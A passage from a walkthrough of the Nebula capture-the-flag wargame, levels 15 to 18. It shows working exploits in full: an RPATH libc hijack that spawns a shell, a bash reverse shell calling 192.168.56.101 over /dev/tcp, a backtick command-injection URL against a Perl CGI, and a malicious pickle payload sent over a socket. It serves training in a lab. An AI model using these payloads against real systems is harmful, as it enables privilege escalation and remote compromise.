+open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+.
+.
+</pre></div>
+</p>
+
+<p>It&rsquo;s trying to load libc.so.6 from a specific location. Why is that? Let&rsquo;s use <code>readelf</code> to take a look</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">evel15@nebula:/home/flag15$ readelf -d ./flag15
+
+Dynamic section at offset 0xf20 contains 21 entries:
+  Tag        Type                         Name/Value
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+ 0x0000000c (INIT)                       0x80482c0
+ .
+ .
+ .
+</pre></div>
+</p>
+
+<p>So it&rsquo;s got an <code>RPATH</code> to that location and as luck would have it we have write permissions to it. I guess we can create our own <code>libc.so.6</code> in that directory and use it to execute some code - like get ourselves a flag15 shell. Let&rsquo;s take a look at what symbols we&rsquo;re actually using</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/home/flag15$ objdump -R flag15
+
+flag15:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a000 R_386_JUMP_SLOT   puts
+0804a004 R_386_JUMP_SLOT   __gmon_start__
+0804a008 R_386_JUMP_SLOT   __libc_start_main
+</pre></div>
+</p>
+
+<p>So we&rsquo;ve got a choice here between <code>__libc_start_main</code> or <code>__gmon_start</code>. As I am more comfortable with <code>__libc_start_main</code> I&rsquo;m going to go with this.</p>
+
+<p>So let us begin with the code for our library by looking up the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function declaration</a></p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;linux/unistd.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">__libc_start_main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">main)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">),</span> 
+<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">init)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fini)</span> 
+<span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">rtld_fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">stack_end)</span> <span style="color: #f8f8f2">{</span>
+  <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>In theory we should get a shell now</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
+</pre></div>
+</p>
+
+<p>Nuts, we have a symbol missing, namely <code>__cxa_finalize</code>. Let&rsquo;s add it an try again
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;linux/unistd.h&gt;</span>
+
+<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">__cxa_finalize</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">d)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">__libc_start_main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">main)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">),</span> 
+<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">init)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fini)</span> 
+<span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">rtld_fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">stack_end)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+</pre></div>
+</p>
+
+<p>What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux&rsquo;s demands. I searched around and found out about <a href="http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html">version scripts</a>. Let&rsquo;s hope it works</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ cat version
+GLIBC_2.0 { };
+level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c -Wl,--version-script<span style="color: #f92672">=</span>version
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+</pre></div>
+</p>
+
+<p><em>sigh</em> - symbol <code>system</code> is missing. Ok, let&rsquo;s just build it statically and wrap it all up so we&rsquo;ve got everything we need. From <code>man gcc</code></p>
+
+<blockquote>
+<p><strong>-static-libgcc</strong>
+          On systems that provide libgcc as a shared library, these options force the use of either the shared or
+          static version respectively.  If no shared version of libgcc
+          was built when the compiler was configured, these options have no effect.</p>
+</blockquote>
+
+<p>So really we can also get rid of our implementation of <code>__cxa_finalize</code> as it&rsquo;s all statically linked now.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script<span style="color: #f92672">=</span>version,-Bstatic -o libc.so.6 mylibc.c
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+sh-4.2$ whoami
+flag15
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-16:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 16</h2>
+
+<blockquote>
+<p>There is a perl script running on port 1616.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/env perl</span>
+
+<span style="color: #66d9ef">use</span> <span style="color: #f8f8f2">CGI</span> <span style="color: #e6db74">qw{param}</span><span style="color: #f8f8f2">;</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Content-type: text/html\n\n&quot;</span><span style="color: #f8f8f2">;</span>
+
+<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">login</span> <span style="color: #f8f8f2">{</span>
+  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #f8f8f2">$password</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">];</span>
+
+  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=~</span> <span style="color: #f8f8f2">tr</span><span style="color: #e6db74">/a-z/</span><span style="color: #f8f8f2">A</span><span style="color: #f92672">-</span><span style="color: #f8f8f2">Z</span><span style="color: #f92672">/</span><span style="color: #f8f8f2">;</span>  <span style="color: #75715e"># conver to uppercase</span>
+  <span style="color: #f8f8f2">$username</span> <span style="color: #f92672">=~</span> <span style="color: #e6db74">s/\s.*//</span><span style="color: #f8f8f2">;</span>    <span style="color: #75715e"># strip everything after a space</span>
+
+  <span style="color: #f8f8f2">@output</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`</span><span style="color: #f8f8f2">;</span>
+  <span style="color: #66d9ef">foreach</span> <span style="color: #f8f8f2">$line</span> <span style="color: #f8f8f2">(@output)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">($usr,</span> <span style="color: #f8f8f2">$pw)</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">split(</span><span style="color: #e6db74">/:/</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$line);</span>
+  
+
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">($pw</span> <span style="color: #f92672">=~</span> <span style="color: #f8f8f2">$password)</span> <span style="color: #f8f8f2">{</span> 
+      <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">}</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">htmlz</span> <span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">($_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Your login was accepted&lt;br/&gt;&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Your login failed&lt;br/&gt;&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span>  
+  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</span><span style="color: #f8f8f2">);</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #f8f8f2">htmlz(login(param(</span><span style="color: #e6db74">&quot;username&quot;</span><span style="color: #f8f8f2">),</span> <span style="color: #f8f8f2">param(</span><span style="color: #e6db74">&quot;password&quot;</span><span style="color: #f8f8f2">)));</span>
+</pre></div>
+</p>
+
+<p>So quickly looking at the script we know that we need to pass <code>username</code> and <code>password</code> in as URL parameters. It then does some uppercase conversion of the username, strips the whitespace and greps for the username in a file called <code>userdb.txt</code>. Taking a look at this file we notice it&rsquo;s empty, so we need a different exploit. The obvious place here is the <code>egrep</code> call as it accepts our username. But we need to do some twiddling in order to get it working with the uppercase and whitespace strip.</p>
+
+<p>One idea is to use bash&rsquo;s feature that allows us to run a command with a wildcard in the path. For example you can run <code>/bin/ls</code> with <code>/*/ls</code> instead. This
+gets us around the uppercase limitation as we can create an uppercase command
+at a path we can write to. I&rsquo;ve chosen <code>/tmp</code> as my target.
+I&rsquo;m going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:~$ nc -l 1337
+</pre></div>
+</p>
+
+<p>To create a netcat listener on port <em>1337</em></p>
+
+<p>Next I construct the payload for the script</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:/home/flag16$ cat /tmp/RSHELL
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.56.101/1337 0&gt;&amp;1
+level16@nebula:/home/flag16$ chmod +x /tmp/SHELL
+</pre></div>
+</p>
+
+<p>Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%60<span style="color: #f8f8f2">&amp;password</span><span style="color: #f92672">=</span>test2
+</pre></div>
+</p>
+
+<p>Back in the shell where we launched the netcat listener we do the following (the <code>whoami</code> is just to confirm I am the right user)</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level16@nebula:~$ nc -l 1337
+bash: no job control in this shell
+flag16@nebula:/home/flag16$ getflag
+getflag
+You have successfully executed getflag on a target account
+flag16@nebula:/home/flag16$ whoami
+whoami
+flag16
+</pre></div>
+</p>
+
+<h2 id="level-17:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 17</h2>
+
+<blockquote>
+<p>There is a python script listening on port 10007 that contains a vulnerability.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/python</span>
+
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">pickle</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">time</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">signal</span>
+
+<span style="color: #f8f8f2">signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">signal(signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SIGCHLD,</span> <span style="color: #f8f8f2">signal</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SIG_IGN)</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">server</span><span style="color: #f8f8f2">(skt):</span>
+  <span style="color: #f8f8f2">line</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+
+  <span style="color: #f8f8f2">obj</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">loads(line)</span>
+
+  <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">obj:</span>
+    <span style="color: #f8f8f2">clnt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;why did you send me &quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;?</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #f8f8f2">skt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">bind((</span><span style="color: #e6db74">&#39;0.0.0.0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">10007</span><span style="color: #f8f8f2">))</span>
+<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">listen(</span><span style="color: #ae81ff">10</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #66d9ef">while</span> <span style="color: #f8f8f2">True:</span>
+  <span style="color: #f8f8f2">clnt,</span> <span style="color: #f8f8f2">addr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">accept()</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fork()</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">):</span>
+    <span style="color: #f8f8f2">clnt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;Accepted connection from %s:%d&quot;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(addr[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">addr[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]))</span>
+    <span style="color: #f8f8f2">server(clnt)</span>
+    <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
+</pre></div>
+</p>
+
+<p>Here <code>pickle</code> provides us with the possibility of an exploit to run our own code. There&rsquo;s lots to read on the security issues with <code>pickle</code>, but to be fair it was never meant to be secure in itself. <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a> and <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> are a good source for more info.</p>
+
+<p>Right, so my plan is to get a shell as <em>flag17</em> and get the flag from there. Using pickle&rsquo;s opcodes I can construct a string that will run <code>getflag</code> from the <code>pickle.loads</code> call as user <em>flag17</em>. So before I started constructing this I copied the script and ran it as <em>level17</em> on a different port in order to debug and see what&rsquo;s going on. Once I was happy with my exploit code I changed the port to <code>10007</code> and ran it to get the flag.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/bin/python</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
+
+<span style="color: #f8f8f2">skt</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((</span><span style="color: #e6db74">&#39;localhost&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">10007</span><span style="color: #f8f8f2">))</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">skt</span>
+<span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">data</span>
+<span style="color: #f8f8f2">sent</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(</span><span style="color: #e6db74">&quot;cos</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">system</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">(S&#39;/bin/bash -c /bin/getflag &gt; /tmp/f17pwned&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">tR</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">sent</span>
+<span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">data</span>
+<span style="color: #f8f8f2">skt</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+</pre></div>
+</p>
+
+<p>I&rsquo;ll explain the pickle string a bit:</p>
+
+<ul>
+<li><code>cos\nsystem</code> resolves the classname and calls it</li>
+<li><code>(</code> is the marker</li>
+<li><code>S'/bin/bash -c /bin/getflag &gt; /tmp/f17pwned'\n</code> this is our command we want to run</li>
+<li><code>tR\n</code> - <code>t</code> puts the string onto the stack and <code>R</code> pops this tuple and calls it, thus executing our lovingly crafted payload.</li>
+</ul>
+
+<p>Once run it looks like it worked so let&rsquo;s be sure</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level17@nebula:/tmp/flag17$ cat ../f17pwned
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-18:eaf9fabfe6e85567a2c1f06adf83e2d8">Level 18</h2>
+
+<blockquote>
+<p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
+<span style="color: #75715e">#include &lt;getopt.h&gt;</span>
+
+<span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">FILE</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">debugfile;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">verbose;</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">loggedin;</span>
+<span style="color: #f8f8f2">}</span> <span style="color: #f8f8f2">globals;</span>
+
+<span style="color: #75715e">#define dprintf(...) if(globals.debugfile) \</span>
+<span style="color: #75715e">  fprintf(globals.debugfile, __VA_ARGS__)</span>
+<span style="color: #75715e">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \</span>
+<span style="color: #75715e">  fprintf(globals.debugfile, __VA_ARGS__)</span>
+
+<span style="color: #75715e">#define PWFILE &quot;/home/flag18/password&quot;</span>
+
+<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">login</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">pw)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">FILE</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">fp;</span>
+
+  <span style="color: #f8f8f2">fp</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fopen(PWFILE,</span> <span style="color: #e6db74">&quot;r&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fp)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">file[</span><span style="color: #ae81ff">64</span><span style="color: #f8f8f2">];</span>
+
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fgets(file,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(file)</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">fp)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Unable to read password file %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">PWFILE);</span>
+      <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">}</span>
+                <span style="color: #f8f8f2">fclose(fp);</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strcmp(pw,</span> <span style="color: #f8f8f2">file)</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #66d9ef">return</span><span style="color: #f8f8f2">;</span>    
+  <span style="color: #f8f8f2">}</span>
+  <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;logged in successfully (with%s password file)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> 
+    <span style="color: #f8f8f2">fp</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL</span> <span style="color: #f92672">?</span> <span style="color: #e6db74">&quot;out&quot;</span> <span style="color: #f92672">:</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">);</span>
+  
+  <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
+
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">notsupported</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">what)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>
+  <span style="color: #f8f8f2">asprintf(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #e6db74">&quot;--&gt; [%s] is unsupported at this current time.</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">what);</span>
+  <span style="color: #f8f8f2">dprintf(what);</span>
+  <span style="color: #f8f8f2">free(buffer);</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">setuser</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">user)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">msg[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>
+
+  <span style="color: #f8f8f2">sprintf(msg,</span> <span style="color: #e6db74">&quot;unable to set user to &#39;%s&#39; -- not supported.</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">user);</span>
